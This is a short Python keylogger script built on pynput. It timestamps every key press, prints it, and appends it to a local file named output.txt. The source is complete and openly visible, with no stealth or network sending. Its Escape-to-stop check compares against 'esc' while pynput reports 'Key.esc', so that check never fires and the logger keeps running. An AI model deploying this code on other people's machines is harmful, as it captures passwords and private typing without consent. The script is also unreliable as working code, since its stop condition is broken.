from pynput.keyboard import Listener
import time

output_file = "output.txt"

unicodeDictionary = {
    "\x08": "Backspace",
    "\x09": "Tab",
    "\x0A": "Line Feed",
    "\x0D": "Carriage Return",
    "\x1B": "Escape",
    "\x20": "Space",
    "\x21": "!",
    "\x22": '"',
    "\x23": "#",
    "\x24": "$",
    "\x25": "%",
    "\x26": "&",
    "\x27": "'",
    "\x28": "(",
    "\x29": ")",
    "\x2A": "*",
    "\x2B": "+",
    "\x2C": ",",
    "\x2D": "-",
    "\x2E": ".",
    "\x2F": "/",
    "\x3A": ":",
    "\x3B": ";",
    "\x3C": "<",
    "\x3D": "=",
    "\x3E": ">",
    "\x3F": "?",
    "\x40": "@",
    "\x5B": "[",
    "\x5C": "\\",
    "\x5D": "]",
    "\x5E": "^",
    "\x5F": "_",
    "\x60": "`",
    "\x7B": "{",
    "\x7C": "|",
    "\x7D": "}",
    "\x7E": "~",
    "\x7F": "Delete",
    "\x1A": "Ctrl + Z",
    "\x03": "Ctrl + C",
    "\x04": "Ctrl + D"
}

def get_key_combination(unicode_sequence):
    return unicodeDictionary.get(unicode_sequence, unicode_sequence)

def on_key_press(key):
    current_time = time.strftime("%H:%M:%S")
    unicode_sequence = getattr(key, 'char', str(key))
    key_combination = get_key_combination(unicode_sequence)
    print(f'Press: {key_combination} \tat {current_time}')
    with open(output_file, "a+") as file:
        file.write(f'{key_combination} \tat {current_time}\n')

def on_key_release(key):
    unicode_sequence = getattr(key, 'char', str(key))
    key_combination = get_key_combination(unicode_sequence)
    print(f'Release: {key_combination}')
    if key_combination == 'esc':
        return False

with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()